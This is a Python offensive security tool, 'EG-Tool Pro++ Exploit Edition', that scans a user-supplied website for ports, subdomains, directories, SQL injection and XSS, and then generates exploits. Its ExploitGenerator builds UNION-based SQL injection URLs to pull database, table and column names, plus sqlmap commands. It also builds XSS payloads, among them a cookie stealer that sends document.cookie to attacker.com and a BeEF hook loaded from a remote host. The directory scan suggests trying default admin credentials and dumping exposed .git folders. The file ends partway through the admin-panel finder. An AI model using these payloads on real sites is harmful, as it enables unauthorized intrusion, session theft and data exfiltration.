#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
EG-Tool Pro++ - Advanced Security Scanner with Exploit Generation
Developer: EGHackers
Version: 5.0 (Exploit Edition)
"""

import os
import sys
import json
import time
import threading
import queue
import requests
import socket
import re
import base64
import urllib.parse
from datetime import datetime
from colorama import Fore, Style, init
from urllib.parse import urlparse, urljoin, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

# Initialize colorama
init(autoreset=True)

# ============================================================================
# EXPLOIT GENERATOR CLASS
# ============================================================================

class ExploitGenerator:
    """Class to generate exploit payloads and commands"""
    
    @staticmethod
    def generate_sql_exploit(url, vulnerable_param, payloads):
        """Generate SQL Injection exploits"""
        exploits = {
            "basic": [],
            "advanced": [],
            "commands": [],
            "resources": []
        }
        
        # Basic exploitation URLs
        for payload in payloads:
            exploit_url = f"{url}?{vulnerable_param}={payload}"
            exploits["basic"].append({
                "description": f"Basic SQL Injection - {payload}",
                "url": exploit_url,
                "risk": "High"
            })
        
        # Advanced exploitation URLs
        advanced_payloads = [
            f"' UNION SELECT null,version()--",
            f"' UNION SELECT null,user()--",
            f"' UNION SELECT null,database()--",
            f"' UNION SELECT null,table_name FROM information_schema.tables--",
            f"' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--"
        ]
        
        for payload in advanced_payloads:
            exploit_url = f"{url}?{vulnerable_param}={payload}"
            exploits["advanced"].append({
                "description": f"Advanced SQLi - {payload}",
                "url": exploit_url,
                "risk": "Critical"
            })
        
        # SQLMap commands
        exploits["commands"].append({
            "tool": "sqlmap",
            "command": f"sqlmap -u \"{url}\" --batch --level=3 --risk=3"
        })
        
        exploits["commands"].append({
            "tool": "sqlmap (with proxy)",
            "command": f"sqlmap -u \"{url}\" --proxy=\"http://127.0.0.1:8080\" --batch"
        })
        
        exploits["resources"].append({
            "type": "cheatsheet",
            "url": "https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet"
        })
        
        return exploits
    
    @staticmethod
    def generate_xss_exploit(url, vulnerable_param):
        """Generate XSS exploits"""
        exploits = {
            "basic": [],
            "advanced": [],
            "commands": [],
            "resources": []
        }
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">"
        ]
        
        for payload in xss_payloads:
            exploit_url = f"{url}?{vulnerable_param}={quote(payload)}"
            exploits["basic"].append({
                "description": f"XSS - {payload[:30]}...",
                "url": exploit_url,
                "risk": "Medium"
            })
        
        # Advanced XSS payloads (Stealing cookies)
        cookie_stealer = "<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>"
        exploit_url = f"{url}?{vulnerable_param}={quote(cookie_stealer)}"
        exploits["advanced"].append({
            "description": "XSS Cookie Stealer",
            "url": exploit_url,
            "risk": "High"
        })
        
        # BeEF hook
        beef_hook = "<script src=\"http://192.168.1.100:3000/hook.js\"></script>"
        exploit_url = f"{url}?{vulnerable_param}={quote(beef_hook)}"
        exploits["advanced"].append({
            "description": "XSS with BeEF Hook",
            "url": exploit_url,
            "risk": "Critical"
        })
        
        exploits["commands"].append({
            "tool": "XSStrike",
            "command": f"python3 xsstrike.py -u \"{url}\" --crawl"
        })
        
        exploits["resources"].append({
            "type": "payloads",
            "url": "https://github.com/payloadbox/xss-payload-list"
        })
        
        return exploits

# ============================================================================
# REAL-TIME DASHBOARD CLASS
# ============================================================================

class RealTimeDashboard:
    """Real-time dashboard for displaying scan progress and results"""
    
    def __init__(self):
        self.results_queue = queue.Queue()
        self.scan_start_time = None
        self.completed_tools = 0
        self.total_tools = 0
        self.critical_findings = []
        self.admin_panels_found = []
        self.status = "initializing"
        self.lock = threading.Lock()
        
    def start_scan(self, total_tools):
        """Initialize dashboard for new scan"""
        self.scan_start_time = datetime.now()
        self.total_tools = total_tools
        self.completed_tools = 0
        self.critical_findings = []
        self.admin_panels_found = []
        self.status = "running"
        
    def update_progress(self, tool_name, status, findings=None, admin_panel=None):
        """Update dashboard with tool results"""
        with self.lock:
            self.completed_tools += 1
            progress_percent = (self.completed_tools / self.total_tools) * 100
            
            # Add to queue for real-time display
            result = {
                "tool": tool_name,
                "status": status,
                "progress": progress_percent,
                "timestamp": datetime.now().strftime("%H:%M:%S")
            }
            
            if findings:
                result["findings"] = findings
                if status in ["critical", "warning"]:
                    self.critical_findings.append({
                        "tool": tool_name,
                        "findings": findings
                    })
            
            if admin_panel:
                result["admin_panel"] = admin_panel
                self.admin_panels_found.append(admin_panel)
            
            self.results_queue.put(result)
    
    def display_dashboard(self):
        """Display real-time dashboard"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                EG-Tool Pro++ - Real-Time Dashboard                ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        # Progress bar
        progress_bar_width = 50
        progress = min(100, max(0, self.completed_tools / self.total_tools * 100))
        filled = int(progress_bar_width * progress / 100)
        bar = f"{Fore.GREEN}{'█' * filled}{Fore.WHITE}{'░' * (progress_bar_width - filled)}{Style.RESET_ALL}"
        
        print(f"\n  📊 Progress: {bar} {progress:.1f}% ({self.completed_tools}/{self.total_tools} tools)")
        
        # Scan duration
        if self.scan_start_time:
            duration = datetime.now() - self.scan_start_time
            mins, secs = divmod(duration.total_seconds(), 60)
            print(f"  ⏱️  Duration: {int(mins)}m {int(secs)}s")
        
        # Status
        status_icon = "🟢" if self.status == "completed" else "🟡" if self.status == "running" else "🔴"
        print(f"  {status_icon} Status: {self.status.title()}")
        
        # Critical findings count
        critical_count = len([f for f in self.critical_findings])
        if critical_count > 0:
            print(f"  ⚠️  Critical Findings: {Fore.RED}{critical_count}{Style.RESET_ALL}")
        else:
            print(f"  ✅ Critical Findings: {Fore.GREEN}0{Style.RESET_ALL}")
        
        # Admin panels found
        if self.admin_panels_found:
            print(f"  🔑 Admin Panels Found: {Fore.YELLOW}{len(self.admin_panels_found)}{Style.RESET_ALL}")
        
        # Recent results (last 5)
        print(f"\n  📋 Recent Results:")
        print(f"  {'─' * 60}")
        
        # Get recent results from queue
        recent_results = []
        while not self.results_queue.empty() and len(recent_results) < 5:
            recent_results.append(self.results_queue.get())
        
        for result in recent_results[-5:]:  # Show last 5
            status_icon = "✅" if result["status"] == "success" else "⚠️" if result["status"] == "warning" else "❌"
            color = Fore.GREEN if result["status"] == "success" else Fore.YELLOW if result["status"] == "warning" else Fore.RED
            
            print(f"  {status_icon} {color}{result['tool']:30} {result['timestamp']}{Style.RESET_ALL}")
            
            if "findings" in result and result["findings"]:
                for finding in result["findings"][:2]:  # Show first 2 findings
                    print(f"      • {finding[:50]}...")
            
            if "admin_panel" in result:
                print(f"      🔑 {Fore.YELLOW}Admin Panel: {result['admin_panel']}{Style.RESET_ALL}")
        
        print(f"\n  {'─' * 60}")
        
        # Real-time alerts
        if self.critical_findings and len(self.critical_findings) <= 3:
            print(f"  🚨 {Fore.RED}CRITICAL ALERTS:{Style.RESET_ALL}")
            for finding in self.critical_findings[-3:]:  # Last 3 critical findings
                print(f"      • {finding['tool']}: {finding['findings'][0][:40]}...")
        
        if self.admin_panels_found:
            print(f"  🔐 {Fore.YELLOW}ADMIN PANELS DISCOVERED:{Style.RESET_ALL}")
            for panel in self.admin_panels_found[:3]:  # First 3 admin panels
                print(f"      • {panel}")
        
        print(f"\n{Fore.CYAN}  Press Ctrl+C to stop scanning...{Style.RESET_ALL}")

# ============================================================================
# TOOL RESULT CLASS
# ============================================================================

class ToolResult:
    """Class to store tool results"""
    def __init__(self, tool_name, status, output, details=None):
        self.tool_name = tool_name
        self.status = status  # success, warning, critical, error
        self.output = output
        self.details = details or {}
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ============================================================================
# MAIN SECURITY SCANNER CLASS WITH EXPLOITS
# ============================================================================

class SecurityScanner:
    """Main Security Scanner with Exploit Generation"""
    
    def __init__(self):
        self.target_url = ""
        self.target_ip = ""
        self.target_domain = ""
        self.results = {}
        self.dashboard = RealTimeDashboard()
        self.exploit_gen = ExploitGenerator()
        self.exploit_results = {}
        self.scan_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Define all tools with enhanced real-time feedback
        self.all_tools = {
            "recon": [
                {"name": "WHOIS Lookup", "function": self.whois_lookup, "critical": False},
                {"name": "DNS Enumeration", "function": self.dns_enumeration, "critical": False},
                {"name": "Subdomain Scanner", "function": self.subdomain_scan, "critical": True},
                {"name": "Port Scanner", "function": self.port_scan, "critical": True},
            ],
            "web": [
                {"name": "SQL Injection Tester", "function": self.sql_injection_test_with_exploits, "critical": True},
                {"name": "XSS Vulnerability Scanner", "function": self.xss_scanner_with_exploits, "critical": True},
                {"name": "Directory Bruteforce", "function": self.directory_bruteforce_with_exploits, "critical": True},
                {"name": "HTTP Headers Analysis", "function": self.http_headers_analysis, "critical": True},
                {"name": "SSL/TLS Scanner", "function": self.ssl_tls_scanner, "critical": True},
                {"name": "Admin Panel Finder", "function": self.admin_panel_finder, "critical": True},
                {"name": "Sensitive File Discovery", "function": self.sensitive_file_discovery, "critical": True},
            ]
        }
    
    def print_banner(self):
        """Display enhanced banner"""
        banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  ███████╗ ██████╗      ████████╗ ██████╗  ██████╗ ██╗      ██████╗  ║
║  ██╔════╝██╔════╝      ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔═══██╗ ║
║  █████╗  ██║    █████╗    ██║   ██║   ██║██║   ██║██║     ██║   ██║ ║
║  ██╔══╝  ██║    ╚════╝    ██║   ██║   ██║██║   ██║██║     ██║   ██║ ║
║  ███████╗╚██████╗         ██║   ╚██████╔╝╚██████╔╝███████╗╚██████╔╝ ║
║  ╚══════╝ ╚═════╝         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝  ║
║                                                                      ║
║                    EG-Tool Pro++ Exploit Edition v5.0               ║
║         Educational Security Scanner with PoC Generation            ║
║                        Developed by: EGHackers                      ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def get_target(self):
        """Get target website from user"""
        print(f"{Fore.YELLOW}[!] IMPORTANT LEGAL DISCLAIMER:{Style.RESET_ALL}")
        print(f"{Fore.RED}══════════════════════════════════════════════════════════════{Style.RESET_ALL}")
        print(f"{Fore.WHITE}1. This tool is for educational and authorized security testing ONLY")
        print("2. Use ONLY on websites you own or have explicit written permission to test")
        print("3. Unauthorized scanning is illegal and unethical")
        print("4. You are solely responsible for your actions")
        print("5. Generated exploits are for educational purposes only")
        print(f"══════════════════════════════════════════════════════════════{Style.RESET_ALL}")
        
        consent = input(f"{Fore.YELLOW}[?] Do you accept full responsibility? (yes/no): {Style.RESET_ALL}").strip().lower()
        
        if consent not in ["yes", "y", "yep", "yeah"]:
            print(f"{Fore.RED}[✗] Tool terminated{Style.RESET_ALL}")
            sys.exit(1)
        
        print(f"\n{Fore.GREEN}[✓] Terms accepted{Style.RESET_ALL}")
        
        # Get target URL
        while True:
            self.target_url = input(f"{Fore.CYAN}[?] Enter target URL (e.g., https://example.com): {Style.RESET_ALL}").strip()
            
            if not self.target_url:
                print(f"{Fore.RED}[✗] Target URL is required{Style.RESET_ALL}")
                continue
            
            # Add protocol if missing
            if not self.target_url.startswith(('http://', 'https://')):
                self.target_url = 'https://' + self.target_url
                print(f"{Fore.YELLOW}[!] Added https:// automatically{Style.RESET_ALL}")
            
            try:
                # Validate URL
                parsed_url = urlparse(self.target_url)
                if not parsed_url.netloc:
                    print(f"{Fore.RED}[✗] Invalid URL format{Style.RESET_ALL}")
                    continue
                
                self.target_domain = parsed_url.netloc
                
                # Try to resolve IP
                try:
                    self.target_ip = socket.gethostbyname(self.target_domain)
                    print(f"{Fore.GREEN}[✓] Target resolved to IP: {self.target_ip}{Style.RESET_ALL}")
                except socket.gaierror:
                    print(f"{Fore.YELLOW}[!] Could not resolve domain to IP{Style.RESET_ALL}")
                    self.target_ip = None
                
                # Quick connectivity test
                try:
                    response = requests.get(self.target_url, timeout=5, allow_redirects=True, verify=False)
                    if response.status_code < 500:
                        print(f"{Fore.GREEN}[✓] Target is reachable (Status: {response.status_code}){Style.RESET_ALL}")
                        break
                    else:
                        print(f"{Fore.YELLOW}[!] Target returned status: {response.status_code}{Style.RESET_ALL}")
                        continue_option = input(f"{Fore.YELLOW}[?] Continue anyway? (yes/no): {Style.RESET_ALL}").strip().lower()
                        if continue_option in ["yes", "y"]:
                            break
                except requests.exceptions.RequestException as e:
                    print(f"{Fore.YELLOW}[!] Connectivity issue: {e}{Style.RESET_ALL}")
                    continue_option = input(f"{Fore.YELLOW}[?] Continue with limited scans? (yes/no): {Style.RESET_ALL}").strip().lower()
                    if continue_option in ["yes", "y"]:
                        break
                        
            except Exception as e:
                print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
    
    def select_tools(self):
        """Let user select which tools to run"""
        print(f"\n{Fore.CYAN}[*] Available Scanning Tools:{Style.RESET_ALL}")
        
        categories = {
            "1": ("Reconnaissance Tools", "recon"),
            "2": ("Web Application Tools (with Exploits)", "web"),
            "3": ("Full Scan (All Tools)", "all")
        }
        
        for key, (name, _) in categories.items():
            tool_count = len(self.all_tools[categories[key][1]]) if key != "3" else sum(len(tools) for tools in self.all_tools.values())
            print(f"  {Fore.YELLOW}{key}. {name} ({tool_count} tools){Style.RESET_ALL}")
        
        selection = input(f"\n{Fore.CYAN}[?] Select category (1-3): {Style.RESET_ALL}").strip().lower()
        
        if selection == "3" or selection == "all":
            # Select all tools
            self.available_tools = []
            for category in self.all_tools.values():
                self.available_tools.extend(category)
            print(f"{Fore.GREEN}[✓] Selected all {len(self.available_tools)} tools{Style.RESET_ALL}")
        
        elif selection in categories:
            category = categories[selection][1]
            self.available_tools = self.all_tools[category]
            print(f"{Fore.GREEN}[✓] Selected {categories[selection][0]} ({len(self.available_tools)} tools){Style.RESET_ALL}")
        
        else:
            print(f"{Fore.YELLOW}[!] Defaulting to Web Application tools{Style.RESET_ALL}")
            self.available_tools = self.all_tools["web"]
    
    def run_scans_with_dashboard(self):
        """Run scans with real-time dashboard"""
        print(f"\n{Fore.CYAN}[*] Initializing scan on {self.target_url}{Style.RESET_ALL}")
        
        # Start dashboard
        total_tools = len(self.available_tools)
        self.dashboard.start_scan(total_tools)
        
        # Start dashboard update thread
        dashboard_thread = threading.Thread(target=self.update_dashboard_periodically)
        dashboard_thread.daemon = True
        dashboard_thread.start()
        
        # Create results directory
        results_dir = self.create_results_directory()
        
        # Run scans
        failed_tools = []
        
        for tool in self.available_tools:
            try:
                result = self.run_single_scan(tool)
                
                # Update dashboard with results
                findings = []
                admin_panel = None
                
                if result.status != "success":
                    findings.append(f"{result.status}: {result.output[:100]}")
                
                if "admin" in tool['name'].lower() and result.status == "success":
                    admin_panel = f"Found at {self.target_url}"
                
                self.dashboard.update_progress(
                    tool['name'], 
                    result.status,
                    findings,
                    admin_panel
                )
                
                self.results[tool['name']] = result
                self.save_tool_result(results_dir, tool['name'], result)
                
                # Small delay to allow dashboard updates
                time.sleep(0.1)
                
            except Exception as e:
                print(f"{Fore.RED}[✗] {tool['name']} failed: {e}{Style.RESET_ALL}")
                failed_tools.append(tool['name'])
                self.dashboard.update_progress(tool['name'], "error", [f"Error: {str(e)}"])
        
        # Mark scan as completed
        self.dashboard.status = "completed"
        time.sleep(1)  # Allow final dashboard update
        
        # Generate summary report
        summary_file = self.generate_summary_report(results_dir, failed_tools)
        
        # Generate exploit report
        exploit_file = self.generate_exploit_report(results_dir)
        
        return results_dir, summary_file, exploit_file, failed_tools
    
    def update_dashboard_periodically(self):
        """Update dashboard every second while scanning"""
        while self.dashboard.status == "running":
            self.dashboard.display_dashboard()
            time.sleep(1)
    
    def run_single_scan(self, tool):
        """Run a single tool scan with enhanced output"""
        try:
            print(f"\n{Fore.BLUE}[→] Running: {tool['name']}{Style.RESET_ALL}")
            result = tool['function']()
            
            # Display important findings immediately
            if result.status != "success":
                status_icon = "⚠️" if result.status == "warning" else "❌"
                color = Fore.YELLOW if result.status == "warning" else Fore.RED
                print(f"  {status_icon} {color}Important: {result.output[:100]}...{Style.RESET_ALL}")
            
            return result
        except Exception as e:
            return ToolResult(tool['name'], "error", f"Tool failed: {str(e)}")
    
    # ============================================================================
    # TOOL IMPLEMENTATIONS WITH EXPLOITS
    # ============================================================================
    
    def sql_injection_test_with_exploits(self):
        """SQL Injection test with exploit generation"""
        print(f"  {Fore.CYAN}[*] Testing for SQL Injection vulnerabilities...{Style.RESET_ALL}")
        
        test_params = ["id", "page", "user", "product", "category"]
        vulnerable_params = []
        all_payloads = {}
        
        for param in test_params:
            payloads = [
                f"{param}='",
                f"{param}=\"",
                f"{param}=1' OR '1'='1",
                f"{param}=1 OR 1=1",
            ]
            
            param_vulnerable = False
            successful_payloads = []
            
            for payload in payloads:
                test_url = f"{self.target_url}?{payload}"
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Check for SQL error indicators
                    error_indicators = [
                        "sql", "mysql", "syntax", "database", "error",
                        "warning", "exception", "unclosed", "quote",
                        "you have an error", "mysql_fetch", "mysqli_"
                    ]
                    
                    page_text = response.text.lower()
                    
                    for indicator in error_indicators:
                        if indicator in page_text:
                            if not param_vulnerable:
                                vulnerable_params.append(param)
                                param_vulnerable = True
                            
                            successful_payloads.append(payload.split('=')[1])
                            
                            # Real-time alert
                            print(f"  {Fore.RED}[!] Potential SQLi in parameter: {param}{Style.RESET_ALL}")
                            print(f"      Payload: {payload}")
                            print(f"      Indicator: {indicator}")
                            break
                    
                except:
                    continue
            
            if param_vulnerable:
                all_payloads[param] = successful_payloads
        
        output = f"SQL Injection Test Results for {self.target_url}:\n\n"
        
        if vulnerable_params:
            output += f"🚨 {Fore.RED}POTENTIAL SQL INJECTION VULNERABILITIES:{Style.RESET_ALL}\n\n"
            output += f"Affected parameters: {', '.join(vulnerable_params)}\n\n"
            
            # Generate exploits for each vulnerable parameter
            for param in vulnerable_params:
                exploits = self.exploit_gen.generate_sql_exploit(
                    self.target_url, 
                    param, 
                    all_payloads[param]
                )
                
                self.exploit_results[f"SQLi_{param}"] = exploits
                
                output += f"🔧 {Fore.YELLOW}Exploits for parameter '{param}':{Style.RESET_ALL}\n"
                
                # Basic exploits
                output += f"  Basic Exploitation URLs:\n"
                for exploit in exploits["basic"][:3]:  # Show first 3
                    output += f"    • {exploit['url']}\n"
                
                # Commands
                output += f"  \n  Automated Tools:\n"
                for cmd in exploits["commands"]:
                    output += f"    • {cmd['tool']}: {cmd['command']}\n"
                
                output += "\n"
            
            output += f"\n⚠ {Fore.YELLOW}SECURITY RECOMMENDATIONS:{Style.RESET_ALL}\n"
            output += "1. Use parameterized queries\n"
            output += "2. Implement input validation\n"
            output += "3. Use stored procedures\n"
            output += "4. Apply principle of least privilege\n"
            output += "5. Use Web Application Firewall\n"
            
            status = "critical"
        else:
            output += f"{Fore.GREEN}✅ No SQL Injection vulnerabilities detected{Style.RESET_ALL}\n"
            output += f"Tested parameters: {', '.join(test_params)}\n"
            status = "success"
        
        return ToolResult("SQL Injection Tester", status, output, {
            "vulnerable_params": vulnerable_params,
            "tested_params": test_params,
            "exploits": self.exploit_results.get(f"SQLi_{param}", {}) if vulnerable_params else {}
        })
    
    def xss_scanner_with_exploits(self):
        """XSS scanner with exploit generation"""
        print(f"  {Fore.CYAN}[*] Testing for XSS vulnerabilities...{Style.RESET_ALL}")
        
        test_params = ["q", "search", "name", "email", "message"]
        vulnerable_params = []
        
        for param in test_params:
            payloads = [
                f"{param}=<script>alert('XSS')</script>",
                f"{param}=\"><script>alert('XSS')</script>",
            ]
            
            for payload in payloads:
                test_url = f"{self.target_url}?{payload}"
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Check if payload is reflected in response
                    if payload.split('=')[1] in response.text:
                        if param not in vulnerable_params:
                            vulnerable_params.append(param)
                        
                        # Real-time alert
                        print(f"  {Fore.RED}[!] Potential XSS in parameter: {param}{Style.RESET_ALL}")
                        print(f"      Payload: {payload.split('=')[1][:20]}...")
                        break
                    
                except:
                    continue
        
        output = f"XSS Scanner Results for {self.target_url}:\n\n"
        
        if vulnerable_params:
            output += f"🚨 {Fore.RED}POTENTIAL XSS VULNERABILITIES:{Style.RESET_ALL}\n\n"
            output += f"Affected parameters: {', '.join(vulnerable_params)}\n\n"
            
            # Generate exploits for each vulnerable parameter
            for param in vulnerable_params:
                exploits = self.exploit_gen.generate_xss_exploit(self.target_url, param)
                self.exploit_results[f"XSS_{param}"] = exploits
                
                output += f"🔧 {Fore.YELLOW}Exploits for parameter '{param}':{Style.RESET_ALL}\n"
                
                # Basic exploits
                output += f"  Basic XSS Payloads:\n"
                for exploit in exploits["basic"][:3]:  # Show first 3
                    output += f"    • {exploit['url']}\n"
                
                output += "\n"
            
            output += f"\n⚠ {Fore.YELLOW}SECURITY RECOMMENDATIONS:{Style.RESET_ALL}\n"
            output += "1. Implement input validation\n"
            output += "2. Use output encoding\n"
            output += "3. Enable Content Security Policy (CSP)\n"
            output += "4. Use security libraries (DOMPurify, etc.)\n"
            output += "5. Regular security testing\n"
            
            status = "critical"
        else:
            output += f"{Fore.GREEN}✅ No XSS vulnerabilities detected{Style.RESET_ALL}\n"
            output += f"Tested parameters: {', '.join(test_params)}\n"
            status = "success"
        
        return ToolResult("XSS Vulnerability Scanner", status, output, {
            "vulnerable_params": vulnerable_params,
            "tested_params": test_params,
            "exploits": self.exploit_results.get(f"XSS_{param}", {}) if vulnerable_params else {}
        })
    
    def directory_bruteforce_with_exploits(self):
        """Directory brute force with exploit suggestions"""
        print(f"  {Fore.CYAN}[*] Brute forcing directories...{Style.RESET_ALL}")
        
        common_dirs = [
            "/admin", "/administrator", "/wp-admin", "/wp-login.php",
            "/login", "/dashboard", "/controlpanel", "/cpanel",
            "/config", "/backup", "/database", "/db", "/sql",
            "/phpmyadmin", "/test", "/api", "/uploads", "/.env",
            "/.git", "/robots.txt", "/sitemap.xml"
        ]
        
        found_dirs = []
        
        for directory in common_dirs:
            test_url = urljoin(self.target_url, directory)
            try:
                response = requests.get(test_url, timeout=3, verify=False)
                if response.status_code < 400:
                    found_dirs.append({
                        "path": directory,
                        "url": test_url,
                        "status": response.status_code,
                        "size": len(response.content)
                    })
            except:
                pass
        
        output = f"Directory Bruteforce for {self.target_url}:\n"
        if found_dirs:
            output += f"Found {len(found_dirs)} accessible paths:\n"
            for item in found_dirs:
                output += f"  • {item['path']} ({item['status']}) - {item['size']} bytes\n"
            
            # Add exploit suggestions for sensitive directories
            output += f"\n🔧 {Fore.YELLOW}Exploit Suggestions:{Style.RESET_ALL}\n"
            
            for dir_info in found_dirs:
                if any(s in dir_info['path'] for s in ['admin', 'login', 'wp-admin']):
                    output += f"  • {dir_info['path']}: Try default credentials (admin/admin, admin/password)\n"
                elif '.env' in dir_info['path']:
                    output += f"  • {dir_info['path']}: Check for API keys and database credentials\n"
                elif '.git' in dir_info['path']:
                    output += f"  • {dir_info['path']}: Use 'git-dumper' to extract source code\n"
            
        else:
            output += "No common paths found\n"
        
        status = "warning" if found_dirs else "success"
        return ToolResult("Directory Bruteforce", status, output, {
            "found_dirs": found_dirs
        })
    
    def whois_lookup(self):
        """WHOIS lookup"""
        print(f"  {Fore.CYAN}[*] Performing WHOIS lookup...{Style.RESET_ALL}")
        
        try:
            # Simulate WHOIS lookup
            output = f"WHOIS Information for {self.target_domain}:\n\n"
            output += "Domain: " + self.target_domain + "\n"
            output += f"IP Address: {self.target_ip or 'Not resolved'}\n"
            output += "Note: Full WHOIS requires external API\n"
            
            return ToolResult("WHOIS Lookup", "success", output)
            
        except Exception as e:
            output = f"WHOIS Lookup error: {str(e)}\n"
            return ToolResult("WHOIS Lookup", "warning", output)
    
    def dns_enumeration(self):
        """DNS enumeration"""
        print(f"  {Fore.CYAN}[*] Enumerating DNS records...{Style.RESET_ALL}")
        
        try:
            import dns.resolver
            
            record_types = ['A', 'AAAA', 'MX', 'TXT']
            results = {}
            
            for rtype in record_types:
                try:
                    answers = dns.resolver.resolve(self.target_domain, rtype)
                    results[rtype] = [str(r) for r in answers]
                    
                    # Display important records
                    if rtype in ['A', 'MX', 'TXT']:
                        print(f"  {Fore.GREEN}[✓] {rtype} records found: {len(answers)}{Style.RESET_ALL}")
                        
                except:
                    results[rtype] = []
            
            output = f"DNS Records for {self.target_domain}:\n\n"
            
            for rtype, values in results.items():
                if values:
                    output += f"{rtype}:\n"
                    for value in values[:3]:  # Show first 3 values
                        output += f"  {value}\n"
                    if len(values) > 3:
                        output += f"  ... and {len(values)-3} more\n"
                    output += "\n"
            
            return ToolResult("DNS Enumeration", "success", output, results)
            
        except ImportError:
            output = "DNS enumeration requires 'dnspython' library\n"
            output += "Install with: pip install dnspython\n"
            return ToolResult("DNS Enumeration", "warning", output)
        except Exception as e:
            output = f"DNS Enumeration failed: {str(e)}\n"
            return ToolResult("DNS Enumeration", "warning", output)
    
    def subdomain_scan(self):
        """Subdomain scanner"""
        print(f"  {Fore.CYAN}[*] Scanning for subdomains...{Style.RESET_ALL}")
        
        common_subs = [
            "www", "mail", "ftp", "admin", "test", "dev",
            "api", "blog", "shop", "support", "portal"
        ]
        
        found_subs = []
        
        for sub in common_subs:
            test_domain = f"{sub}.{self.target_domain}"
            try:
                socket.gethostbyname(test_domain)
                found_subs.append(test_domain)
                print(f"  {Fore.GREEN}[✓] Found: {test_domain}{Style.RESET_ALL}")
            except:
                pass
        
        output = f"Subdomain Scan Results for {self.target_domain}:\n\n"
        
        if found_subs:
            output += f"🌐 {Fore.YELLOW}FOUND {len(found_subs)} SUBDOMAINS:{Style.RESET_ALL}\n\n"
            for sub in found_subs:
                output += f"  • {sub}\n"
            
            status = "warning"
        else:
            output += f"{Fore.GREEN}✅ No subdomains found{Style.RESET_ALL}\n"
            status = "success"
        
        return ToolResult("Subdomain Scanner", status, output, {
            "found_subs": found_subs
        })
    
    def port_scan(self):
        """Port scanner"""
        print(f"  {Fore.CYAN}[*] Scanning ports...{Style.RESET_ALL}")
        
        if not self.target_ip:
            return ToolResult("Port Scanner", "error", "No IP address available for scanning")
        
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            5900: "VNC",
            6379: "Redis",
            8080: "HTTP-Alt",
            8443: "HTTPS-Alt",
        }
        
        open_ports = []
        
        for port, service in common_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                
                if result == 0:
                    open_ports.append((port, service))
                    print(f"  {Fore.GREEN}[✓] Port open: {port} ({service}){Style.RESET_ALL}")
                
                sock.close()
            except:
                pass
        
        output = f"Port Scan Results for {self.target_ip}:\n\n"
        
        if open_ports:
            output += f"🔓 {Fore.YELLOW}OPEN PORTS ({len(open_ports)}):{Style.RESET_ALL}\n\n"
            for port, service in open_ports:
                output += f"  • Port {port}: {service}\n"
            
            status = "warning"
        else:
            output += f"{Fore.GREEN}✅ No open ports detected{Style.RESET_ALL}\n"
            status = "success"
        
        return ToolResult("Port Scanner", status, output, {
            "open_ports": open_ports
        })
    
    def http_headers_analysis(self):
        """Analyze HTTP headers"""
        try:
            response = requests.get(self.target_url, timeout=10, verify=False)
            headers = dict(response.headers)
            
            output = f"HTTP Headers Analysis for {self.target_url}:\n"
            output += f"Status Code: {response.status_code}\n"
            output += f"Server: {headers.get('Server', 'Not disclosed')}\n"
            
            # Analyze security headers
            security_headers = {
                'Content-Security-Policy': 'CSP',
                'Strict-Transport-Security': 'HSTS',
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing',
                'X-XSS-Protection': 'XSS protection',
                'Referrer-Policy': 'Referrer control'
            }
            
            missing = []
            for header, desc in security_headers.items():
                if header in headers:
                    output += f"✓ {header}: Present ({desc})\n"
                else:
                    output += f"✗ {header}: Missing\n"
                    missing.append(header)
            
            details = {
                "total_headers": len(headers),
                "missing_security_headers": missing,
                "server": headers.get('Server'),
                "content_type": headers.get('Content-Type')
            }
            
            status = "warning" if missing else "success"
            return ToolResult("HTTP Headers Analysis", status, output, details)
        except Exception as e:
            output = f"HTTP Headers Analysis failed: {e}\n"
            return ToolResult("HTTP Headers Analysis", "error", output)
    
    def ssl_tls_scanner(self):
        """SSL/TLS configuration scanner"""
        try:
            parsed = urlparse(self.target_url)
            if parsed.scheme != 'https':
                output = f"Target not using HTTPS: {self.target_url}\n"
                return ToolResult("SSL/TLS Scanner", "warning", output)
            
            # Simplified SSL check
            try:
                response = requests.get(self.target_url, timeout=10, verify=True)
                output = f"SSL/TLS Certificate Info for {self.target_url}:\n"
                output += "✓ SSL certificate is valid\n"
                output += "✓ Connection is encrypted\n"
                
                return ToolResult("SSL/TLS Scanner", "success", output)
            except requests.exceptions.SSLError:
                output = "✗ SSL certificate error\n"
                return ToolResult("SSL/TLS Scanner", "critical", output)
            
        except Exception as e:
            output = f"SSL/TLS Scanner error: {e}\n"
            return ToolResult("SSL/TLS Scanner", "error", output)
    
    def admin_panel_finder(self):
        """Admin panel finder"""
        print(f"  {Fore.CYAN}[*] Scanning for admin panels...{Style.RESET_ALL}")
        
